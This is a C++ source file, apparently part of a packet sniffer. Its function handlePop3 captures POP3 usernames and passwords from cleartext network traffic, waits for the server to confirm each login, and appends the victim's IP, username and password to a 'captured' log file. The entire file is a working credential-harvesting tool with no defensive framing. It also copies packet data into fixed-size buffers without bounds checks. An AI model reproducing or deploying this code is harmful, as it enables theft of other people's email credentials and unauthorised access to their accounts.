#include <stdio.h>
#include <map>
#include <iostream>
#include <string.h>
#include <pcap.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <stdlib.h>
#include <ctype.h>

#include "common.h"

using namespace std;

map<string, map<string, string> > sessionStringsPop3;
map<string, map<string, int> > sessionIntsPop3;




bool handlePop3(char *srcIp, int srcPort, char *dstIp, int dstPort, const u_char *payload, int payload_length) {

    if(memcmp(myIp, srcIp, sizeof(myIp)) == 0) {
        char sessionName[22] = { 0 };
        sprintf(sessionName, "%s:%d", dstIp, dstPort);

        if(memcmp(payload, "USER ", 5) == 0) {

            for(const u_char *pointer = payload; pointer[0]!=0; pointer++) {
                if(pointer[0]=='\n') {
                    char username[256] = { 0 };
                    memcpy(username, payload + 5, pointer - payload - 6);
                    sessionStringsPop3[sessionName]["user"] = username;
                    //printf("1\n");
                    return true;
                }
            }

        }
        else if(memcmp(payload, "PASS ", 5) == 0) {
            if(strlen(sessionStringsPop3[sessionName]["user"].c_str())>0) {
                if(sessionIntsPop3[sessionName]["userOK"] == 1) {

                    for(const u_char *pointer = payload; pointer[0]!=0; pointer++) {
                        if(pointer[0]=='\n') {
                            char password[256] = { 0 };
                            memcpy(password, payload + 5, pointer - payload - 6);
                            sessionStringsPop3[sessionName]["pass"] = password;
                            //printf("3\n");
                            return true;
                        }
                    }

                }
            }
        }
    }
    else {
        char sessionName[22] = { 0 };
        sprintf(sessionName, "%s:%d", srcIp, srcPort);

        if(memcmp(payload, "+OK send your password", sizeof("+OK send your password") - 1) == 0) {
            if(strlen(sessionStringsPop3[sessionName]["user"].c_str())>0) {
                sessionIntsPop3[sessionName]["userOK"] = 1;
                //printf("2\n");
                return true;
            }
        }
        else if(memcmp(payload, "+OK", sizeof("+OK") - 1) == 0) {
            if(strlen(sessionStringsPop3[sessionName]["user"].c_str())>0) {
                if(strlen(sessionStringsPop3[sessionName]["pass"].c_str())>0) {
                    char dataToWrite[2048] = { 0 };

                    sprintf(dataToWrite, "%s:%s:%s\n", srcIp, sessionStringsPop3[sessionName]["user"].c_str(), sessionStringsPop3[sessionName]["pass"].c_str() );
                    FILE* pFile = fopen("./captured/pop3.txt", "a");
                    fwrite(dataToWrite, sizeof(char), strlen(dataToWrite), pFile);
                    fclose(pFile);

                    printf("%s", dataToWrite);
                    sessionStringsPop3[sessionName]["user"].clear();
                    sessionStringsPop3[sessionName]["pass"].clear();
                    sessionIntsPop3[sessionName]["userOK"] = 0;
                }
            }
        }

    }
    return false;
}